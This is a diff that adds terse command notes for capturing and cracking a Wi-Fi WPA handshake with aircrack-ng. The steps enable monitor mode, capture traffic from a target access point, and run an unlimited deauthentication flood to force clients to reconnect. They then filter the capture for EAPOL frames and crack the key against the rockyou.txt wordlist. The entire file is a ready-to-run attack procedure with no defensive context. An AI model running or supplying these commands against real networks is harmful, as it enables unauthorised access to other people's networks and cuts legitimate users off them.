@@ -1,0 +1,19 @@
+ip addr
+iwconfig
+sudo airmon-ng start wlan0
+sudo airmon-ng
+sudo airodump-ng wlan0mon
+ctrl c
+sudo airodump-ng wlan0mon -d mac_address
+sudo airodump-ng -w filename -c 2 --bssid mac_address wlan0mon
+// ctrl c after handshake is captured
+
+
+// second window
+sudo aireplay-ng --deauth 0 -a mac_address wlan0mon
+ls
+wireshark filename
+search => eapol
+sudo airmon-ng stop wlan0mon
+aircrack-ng filename -w rockyou.txt
+
